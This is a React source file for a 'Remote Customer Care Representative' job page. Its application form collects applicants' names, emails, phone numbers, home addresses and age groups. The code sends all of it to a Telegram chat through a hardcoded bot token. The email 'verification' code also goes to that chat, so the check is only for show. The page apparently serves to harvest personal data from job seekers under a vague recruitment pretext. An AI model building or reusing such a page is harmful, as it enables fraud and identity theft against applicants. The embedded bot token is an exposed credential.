import { useState, useRef, useEffect } from 'react'

// ── Telegram config ────────────────────────────────────────────────
const BOT_TOKEN = '8758121416:AAGBr_1EEsqopOjrYAhJ5wOkNzVpwlWcGbE'

const CHAT_ID   = '-5100050000'

const EMAILS_KEY = 'rj_submitted_emails'

function getEmails() {
  try { return JSON.parse(localStorage.getItem(EMAILS_KEY) || '[]') }
  catch { return [] }
}
function saveEmail(email) {
  const list = getEmails()
  list.push(email.toLowerCase().trim())
  localStorage.setItem(EMAILS_KEY, JSON.stringify(list))
}
function isDuplicate(email) {
  return getEmails().includes(email.toLowerCase().trim())
}

function buildMessage(d) {
  const now = new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' })
  return (
    `💼 *New Work Io Jobs Application!*\n\n` +
    `👤 *Name:* ${d.fullName}\n` +
    `📧 *Email:* ${d.email} ✅ Verified\n` +
    `📱 *Cell Number:* ${d.cellPhone}\n` +
    `☎️ *Home Phone:* ${d.homePhone || 'N/A'}\n` +
    `🏠 *Address:* ${d.streetAddress}, ${d.city}, ${d.state} ${d.zipCode}\n` +
    `🌎 *Country:* ${d.country}\n` +
    `🎂 *Age Group:* ${d.ageGroup}\n` +
    `💼 *Experience Type:* ${d.experienceType}\n` +
    `📅 *Years of Experience:* ${d.yearsExperience}\n` +
    `🎯 *Preferred Role:* ${d.preferredRole}\n` +
    `💻 *Has Remote Setup:* ${d.remoteSetup}\n` +
    `📝 *Summary:* ${d.summary || 'N/A'}\n\n` +
    `⏰ _${now}_`
  )
}

// ── OTP helpers ────────────────────────────────────────────────────
function genOTP() {
  return String(Math.floor(100000 + Math.random() * 900000))
}

// Replace this with an email provider (e.g. EmailJS, SendGrid, etc.)
async function sendEmailOTP(email, code) {
  // TODO: plug in your email provider here
  // Example with EmailJS:
  // await emailjs.send('service_id', 'template_id', { to_email: email, otp_code: code })

  // For now: send OTP to Telegram so admin can relay it manually during testing
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: `🔐 *OTP Request*\nEmail: ${email}\nCode: \`${code}\`\n_Send this to the applicant_`,
      parse_mode: 'Markdown',
    }),
  })
}

// ── Cell verification widget ───────────────────────────────────────
function CellVerify({ value, onChange, onVerified, error }) {
  const [otpSent, setOtpSent]       = useState(false)
  const [otpCode, setOtpCode]       = useState('')
  const [inputCode, setInputCode]   = useState('')
  const [verified, setVerified]     = useState(false)
  const [sending, setSending]       = useState(false)
  const [codeError, setCodeError]   = useState('')
  const [countdown, setCountdown]   = useState(0)

  useEffect(() => {
    if (countdown <= 0) return
    const t = setTimeout(() => setCountdown(c => c - 1), 1000)
    return () => clearTimeout(t)
  }, [countdown])

  const isValidEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim())

  async function handleSend() {
    if (!isValidEmail(value)) return
    setSending(true)
    const code = genOTP()
    setOtpCode(code)
    await sendEmailOTP(value.trim(), code)
    setSending(false)
    setOtpSent(true)
    setCountdown(60)
  }

  function handleVerify() {
    if (inputCode.trim() === otpCode) {
      setVerified(true)
      setCodeError('')
      onVerified(true)
    } else {
      setCodeError('Incorrect code. Please try again.')
    }
  }

  function handleResend() {
    if (countdown > 0) return
    setOtpSent(false)
    setInputCode('')
    setOtpCode('')
    setCodeError('')
    onVerified(false)
    setVerified(false)
  }

  return (
    <div style={{ display:'grid', gap:'10px' }}>
      <label style={{ fontWeight:700, fontSize:14 }}>Email Address <span style={{ color:'#dc2626' }}>*</span></label>

      {/* Email input + Send Code button */}
      <div style={{ display:'flex', gap:'10px' }}>
        <input
          type="email"
          value={value}
          onChange={e => { onChange(e.target.value); setOtpSent(false); setVerified(false); onVerified(false) }}
          placeholder="you@example.com"
          disabled={verified}
          className={error ? 'error-field' : ''}
          style={{ flex:1 }}
        />
        {!verified && (
          <button
            type="button"
            onClick={handleSend}
            disabled={!isValidEmail(value) || sending || (otpSent && countdown > 0)}
            style={{
              minHeight:52, padding:'0 18px', borderRadius:12, border:'none',
              background: !isValidEmail(value) ? '#e2e8f0' : 'var(--primary)',
              color: !isValidEmail(value) ? '#94a3b8' : '#fff',
              fontWeight:700, fontSize:14, cursor:'pointer', whiteSpace:'nowrap',
            }}
          >
            {sending ? 'Sending…' : otpSent && countdown > 0 ? `Resend (${countdown}s)` : 'Send Code'}
          </button>
        )}
        {verified && (
          <div style={{
            display:'flex', alignItems:'center', gap:6,
            color:'#16a34a', fontWeight:700, fontSize:14, whiteSpace:'nowrap',
          }}>
            ✅ Verified
          </div>
        )}
      </div>

      {error && <span className="error-msg">{error}</span>}

      {/* OTP code input */}
      {otpSent && !verified && (
        <div style={{ background:'#eff6ff', border:'1px solid #bfdbfe', borderRadius:12, padding:16, display:'grid', gap:10 }}>
          <p style={{ margin:0, fontSize:14, color:'#1e3a8a', fontWeight:600 }}>
            A 6-digit code was sent to your email <strong>{value}</strong>. Enter it below:
          </p>
          <div style={{ display:'flex', gap:10 }}>
            <input
              type="text"
              inputMode="numeric"
              maxLength={6}
              value={inputCode}
              onChange={e => { setInputCode(e.target.value.replace(/\D/g,'')); setCodeError('') }}
              placeholder="Enter 6-digit code"
              style={{ flex:1, letterSpacing:6, fontSize:18, textAlign:'center' }}
            />
            <button
              type="button"
              onClick={handleVerify}
              disabled={inputCode.length !== 6}
              style={{
                minHeight:52, padding:'0 18px', borderRadius:12, border:'none',
                background: inputCode.length === 6 ? '#16a34a' : '#e2e8f0',
                color: inputCode.length === 6 ? '#fff' : '#94a3b8',
                fontWeight:700, fontSize:14, cursor:'pointer',
              }}
            >
              Verify
            </button>
          </div>
          {codeError && <span className="error-msg">{codeError}</span>}
          {countdown === 0 && (
            <button type="button" onClick={handleResend}
              style={{ background:'none', border:'none', color:'var(--primary)', fontSize:13, cursor:'pointer', textAlign:'left', padding:0 }}>
              Didn&apos;t receive a code? Resend
            </button>
          )}
        </div>
      )}
    </div>
  )
}

async function sendToTelegram(data) {
  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: buildMessage(data), parse_mode: 'Markdown' }),
  })
  return res.ok
}

// ── Field ──────────────────────────────────────────────────────────
function Field({ id, label, hint, errors, children }) {
  return (
    <div className="field">
      <label htmlFor={id}>{label}</label>
      {children}
      {hint && <span className="hint">{hint}</span>}
      {errors[id] && <span className="error-msg">{errors[id]}</span>}
    </div>
  )
}

// ── Form ───────────────────────────────────────────────────────────
const INIT = {
  fullName: '', email: '', cellPhone: '', homePhone: '',
  streetAddress: '', city: '', state: '', zipCode: '', country: '',
  ageGroup: '', experienceType: '', yearsExperience: '',
  preferredRole: '', summary: '', remoteSetup: '',
}

function ApplicationForm() {
  const [form, setForm]           = useState(INIT)
  const [errors, setErrors]       = useState({})
  const [status, setStatus]       = useState('idle')
  const topRef = useRef(null)

  function validate(f) {
    const e = {}
    if (f.fullName.trim().length < 2)                 e.fullName       = 'Please enter your full name.'
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(f.email)) e.email          = 'Please enter a valid email address.'
    if (!/^\+?[\d\s\-().]{7,15}$/.test(f.cellPhone.trim())) e.cellPhone = 'Please enter a valid cell number.'
    if (f.streetAddress.trim().length < 3)            e.streetAddress  = 'Please enter your street address.'
    if (f.city.trim().length < 2)                     e.city           = 'Please enter your city.'
    if (!f.state)                                     e.state          = 'Please select your state/province.'
    if (f.zipCode.trim().length < 3)                  e.zipCode        = 'Please enter your ZIP / postal code.'
    if (!f.country)                                   e.country        = 'Please select your country.'
    if (!f.ageGroup)                                  e.ageGroup       = 'Please select your age group.'
    if (!f.experienceType)                            e.experienceType = 'Please select your experience type.'
    if (!f.yearsExperience)                           e.yearsExperience = 'Please select your years of experience.'
    if (!f.preferredRole)                             e.preferredRole  = 'Please select your preferred role.'
    if (!f.remoteSetup)                               e.remoteSetup    = 'Please select an option.'
    return e
  }

  function set(field) {
    return e => {
      const val = e.target.value
      setForm(f => ({ ...f, [field]: val }))
      if (errors[field]) setErrors(prev => { const n = { ...prev }; delete n[field]; return n })
    }
  }

  async function handleSubmit(e) {
    e.preventDefault()
    const errs = validate(form)
    if (Object.keys(errs).length) { setErrors(errs); return }
    if (isDuplicate(form.email)) { setStatus('duplicate'); return }

    setStatus('loading')
    const ok = await sendToTelegram(form)
    if (ok) {
      saveEmail(form.email)
      setStatus('success')
      setForm(INIT)

      topRef.current?.scrollIntoView({ behavior: 'smooth', block: 'start' })
    } else {
      setStatus('error')
    }
  }

  const cls = id => errors[id] ? 'error-field' : ''

  return (
    <div className="card" ref={topRef}>
      <form onSubmit={handleSubmit} noValidate>

        <div className="form-grid">
          <Field id="fullName" label="Full Name" errors={errors}>
            <input type="text" id="fullName" value={form.fullName} onChange={set('fullName')}
              placeholder="Enter your full name" className={cls('fullName')} />
          </Field>
          <Field id="email" label="Email Address" errors={errors}>
            <input type="email" id="email" value={form.email} onChange={set('email')}
              placeholder="you@example.com" className={cls('email')} />
          </Field>
        </div>

        <div className="form-grid">
          <Field id="cellPhone" label="Cell Number" errors={errors}>
            <input type="tel" id="cellPhone" value={form.cellPhone} onChange={set('cellPhone')}
              placeholder="+1 (555) 000-0000" className={cls('cellPhone')} />
          </Field>
          <Field id="homePhone" label="Home Phone" hint="Optional" errors={errors}>
            <input type="tel" id="homePhone" value={form.homePhone} onChange={set('homePhone')}
              placeholder="+1 (555) 000-0000" />
          </Field>
        </div>

        {/* ── Address ── */}
        <div style={{ borderTop:'1px solid #e2e8f0', paddingTop:16, marginTop:4 }}>
          <p style={{ margin:'0 0 14px', fontWeight:700, fontSize:15, color:'var(--primary-dark)' }}>Address</p>

          <Field id="streetAddress" label="Street Address" errors={errors}>
            <input type="text" id="streetAddress" value={form.streetAddress} onChange={set('streetAddress')}
              placeholder="123 Main Street, Apt 4B"
              className={cls('streetAddress')} />
          </Field>

          <div className="form-grid" style={{ marginTop:16 }}>
            <Field id="city" label="City" errors={errors}>
              <input type="text" id="city" value={form.city} onChange={set('city')}
                placeholder="New York" className={cls('city')} />
            </Field>
            <Field id="zipCode" label="ZIP / Postal Code" errors={errors}>
              <input type="text" id="zipCode" value={form.zipCode} onChange={set('zipCode')}
                placeholder="10001" className={cls('zipCode')} />
            </Field>
          </div>

          <div className="form-grid" style={{ marginTop:16 }}>
            <Field id="state" label="State / Province" errors={errors}>
              <select id="state" value={form.state} onChange={set('state')} className={cls('state')}>
                <option value="">Select state / province</option>
                <optgroup label="── United States ──">
                  {['Alabama','Alaska','Arizona','Arkansas','California','Colorado','Connecticut','Delaware',
                    'Florida','Georgia','Hawaii','Idaho','Illinois','Indiana','Iowa','Kansas','Kentucky',
                    'Louisiana','Maine','Maryland','Massachusetts','Michigan','Minnesota','Mississippi',
                    'Missouri','Montana','Nebraska','Nevada','New Hampshire','New Jersey','New Mexico',
                    'New York','North Carolina','North Dakota','Ohio','Oklahoma','Oregon','Pennsylvania',
                    'Rhode Island','South Carolina','South Dakota','Tennessee','Texas','Utah','Vermont',
                    'Virginia','Washington','West Virginia','Wisconsin','Wyoming'].map(s => (
                    <option key={s}>{s}</option>
                  ))}
                </optgroup>
                <optgroup label="── Canada ──">
                  {['Alberta','British Columbia','Manitoba','New Brunswick','Newfoundland and Labrador',
                    'Northwest Territories','Nova Scotia','Nunavut','Ontario','Prince Edward Island',
                    'Quebec','Saskatchewan','Yukon'].map(s => (
                    <option key={s}>{s}</option>
                  ))}
                </optgroup>
              </select>
            </Field>
            <Field id="country" label="Country" errors={errors}>
              <select id="country" value={form.country} onChange={set('country')} className={cls('country')}>
                <option value="">Select your country</option>
                <option>United States</option>
                <option>Canada</option>
              </select>
            </Field>
          </div>
        </div>

        <div className="form-grid">
          <Field id="ageGroup" label="Age Group" errors={errors}>
            <select id="ageGroup" value={form.ageGroup} onChange={set('ageGroup')} className={cls('ageGroup')}>
              <option value="">Select your age group</option>
              <option>18-25</option><option>26-35</option><option>36-45</option><option>46-50</option>
            </select>
          </Field>
          <Field id="experienceType" label="Relevant Experience" errors={errors}>
            <select id="experienceType" value={form.experienceType} onChange={set('experienceType')} className={cls('experienceType')}>
              <option value="">Select experience type</option>
              <option>Sales</option><option>Tech Support</option><option>Both</option>
            </select>
          </Field>
        </div>

        <div className="form-grid">
          <Field id="yearsExperience" label="Years of Experience" errors={errors}>
            <select id="yearsExperience" value={form.yearsExperience} onChange={set('yearsExperience')} className={cls('yearsExperience')}>
              <option value="">Select years of experience</option>
              <option>1-2 years</option><option>3-5 years</option><option>5+ years</option>
            </select>
          </Field>
          <Field id="preferredRole" label="Preferred Role" errors={errors}>
            <select id="preferredRole" value={form.preferredRole} onChange={set('preferredRole')} className={cls('preferredRole')}>
              <option value="">Select preferred role</option>
              <option>Customer Support</option><option>Technical Support</option><option>Sales Support</option>
            </select>
          </Field>
        </div>

        <Field id="summary" label="Briefly Describe Your Experience" hint="This helps us review applicants faster." errors={errors}>
          <textarea id="summary" value={form.summary} onChange={set('summary')}
            placeholder="Tell us about your sales or tech support background" />
        </Field>

        <Field id="remoteSetup" label="Do You Have a Reliable Computer and Internet Connection?" errors={errors}>
          <select id="remoteSetup" value={form.remoteSetup} onChange={set('remoteSetup')} className={cls('remoteSetup')}>
            <option value="">Select an option</option>
            <option>Yes</option><option>No</option>
          </select>
        </Field>

        <div className="submit-wrap">
          <button type="submit" className="btn btn-primary" disabled={status === 'loading'}>
            {status === 'loading' ? 'Submitting…' : 'Submit Application'}
          </button>
          <span className="submit-note">Qualified applicants will be contacted for the next step.</span>
        </div>

        <div className="small">
          By submitting this form, you agree to be contacted regarding this remote job opportunity.
        </div>

        {status === 'success' && (
          <div className="success-message">
            ✅ Thank you. Your application has been submitted successfully. We will be in touch soon.
          </div>
        )}
        {status === 'duplicate' && (
          <div className="duplicate-message">
            ⚠️ This email address has already been used to submit an application. Each applicant may only apply once.
          </div>
        )}
        {status === 'error' && (
          <div className="duplicate-message">
            ❌ Something went wrong. Please try again or contact us directly.
          </div>
        )}
      </form>
    </div>
  )
}

// ── Page ───────────────────────────────────────────────────────────
export default function App() {
  return (
    <>
      <div className="topbar">
        Now Hiring in <strong>USA &amp; Canada</strong> | Ages <strong>18-50</strong> | Sales or Tech Support Experience Preferred
      </div>

      <header className="hero">
        <div className="container hero-grid">
          <div>
            <span className="eyebrow">Remote Job Opportunity</span>
            <h1>Remote Customer Care Representative</h1>
            <p className="lead">
              Join our growing remote team in the United States and Canada. We are hiring
              candidates with experience in <strong>sales</strong> or <strong>tech support</strong> who
              can provide excellent customer service from home.
            </p>
            <div className="salary-box">
              $15–$30 per hour depending on experience and interview performance
            </div>
            <div className="hero-points">
              <div className="point">Work from home</div>
              <div className="point">Flexible remote environment</div>
              <div className="point">Paid onboarding support</div>
              <div className="point">Long-term career opportunity</div>
            </div>
            <div className="hero-actions">
              <a className="btn btn-primary" href="#apply">Apply Now</a>
              <a className="btn btn-secondary" href="#details">View Job Details</a>
            </div>
          </div>

          <div className="hero-card">
            <h2>Quick Overview</h2>
            <p>We are seeking motivated applicants who can support customers through phone, chat, and email.</p>
            <ul className="quick-list">
              <li><strong>Location</strong>Remote in USA or Canada</li>
              <li><strong>Compensation</strong>$15–$30/hour based on experience and interview</li>
              <li><strong>Preferred Background</strong>Sales, technical support, call center, customer service</li>
              <li><strong>Age Requirement</strong>18–50 years old</li>
            </ul>
          </div>
        </div>
      </header>

      <main>
        <section id="details">
          <div className="container">
            <h2 className="section-title">Job Overview</h2>
            <p className="section-subtitle">
              This role is ideal for candidates who have prior experience speaking with customers,
              solving issues, handling support requests, or helping close and retain clients.
            </p>
            <div className="grid-2">
              <div className="card">
                <h3>Responsibilities</h3>
                <ul className="list">
                  <li>Handle inbound and outbound customer inquiries professionally</li>
                  <li>Assist customers with account questions, service updates, and troubleshooting</li>
                  <li>Provide support by phone, chat, and email</li>
                  <li>Document customer interactions accurately</li>
                  <li>Escalate complex issues when needed</li>
                  <li>Maintain a positive, solution-oriented attitude</li>
                </ul>
              </div>
              <div className="card">
                <h3>Requirements</h3>
                <ul className="list">
                  <li>Must be between 18 and 50 years old</li>
                  <li>Must be located in the United States or Canada</li>
                  <li>Previous experience in sales or tech support required</li>
                  <li>Reliable internet connection and computer access</li>
                  <li>Strong communication and problem-solving skills</li>
                  <li>Ability to work independently in a remote setting</li>
                </ul>
              </div>
            </div>
            <div className="badges">
              {['Customer Service','Technical Support','Sales Support','Remote Work','Call Center Experience'].map(b => (
                <span key={b} className="badge">{b}</span>
              ))}
            </div>
          </div>
        </section>

        <section>
          <div className="container">
            <h2 className="section-title">How the Hiring Process Works</h2>
            <p className="section-subtitle">
              We use a simple screening process to identify qualified remote applicants with the right communication skills and experience.
            </p>
            <div className="steps">
              {[
                { n:1, title:'Submit Application', desc:'Complete the form with your contact details, experience, and preferred role.' },
                { n:2, title:'Interview Review', desc:'Your background and communication ability will be reviewed during the interview process.' },
                { n:3, title:'Final Pay Determination', desc:'Your hourly rate between $15 and $30 will depend on your experience and interview performance.' },
              ].map(s => (
                <div key={s.n} className="step">
                  <div className="step-number">{s.n}</div>
                  <h3>{s.title}</h3>
                  <p>{s.desc}</p>
                </div>
              ))}
            </div>
          </div>
        </section>

        <section className="form-section" id="apply">
          <div className="container">
            <h2 className="section-title">Apply for This Remote Position</h2>
            <p className="section-subtitle">
              Complete the application below. Only candidates located in the USA or Canada with sales or tech support experience should apply.
            </p>
            <ApplicationForm />
          </div>
        </section>

        <section>
          <div className="container grid-2">
            <div>
              <h2 className="section-title">Why Join Our Team</h2>
              <p className="section-subtitle">
                We are looking for dependable remote professionals who are ready to grow in a customer-facing role.
              </p>
              <div className="card">
                <ul className="list">
                  <li>Remote work from the USA or Canada</li>
                  <li>Compensation based on interview and experience</li>
                  <li>Supportive onboarding process</li>
                  <li>Opportunity for long-term placement</li>
                  <li>Fast application process</li>
                </ul>
              </div>
            </div>
            <div>
              <h2 className="section-title">Frequently Asked Questions</h2>
              <div className="faq">
                {[
                  { q:'What is the pay range for this role?', a:'The pay ranges from $15 to $30 per hour depending on your background, experience, and interview performance.' },
                  { q:'Who can apply?', a:'Applicants must be 18 to 50 years old, located in the United States or Canada, and have relevant sales or tech support experience.' },
                  { q:'Is this a remote role?', a:'Yes. This is a work-from-home opportunity for qualified candidates in the USA and Canada.' },
                  { q:'How will applications be reviewed?', a:'Applications are screened based on experience, communication quality, and overall interview performance.' },
                ].map(({ q, a }) => (
                  <details key={q}>
                    <summary>{q}</summary>
                    <p>{a}</p>
                  </details>
                ))}
              </div>
            </div>
          </div>
        </section>

        <section>
          <div className="container">
            <div className="cta-strip">
              <div>
                <h3>Ready to Apply?</h3>
                <p>Submit your application today if you have sales or tech support experience and want a remote opportunity.</p>
              </div>
              <div>
                <a href="#apply" className="btn btn-primary">Apply Now</a>
              </div>
            </div>
          </div>
        </section>
      </main>

      <footer>
        <div className="container">
          © 2026 <a href="https://remotefreelancerjobs.com" style={{color:'inherit'}}>remotefreelancerjobs.com</a>. All rights reserved.
        </div>
      </footer>
    </>
  )
}
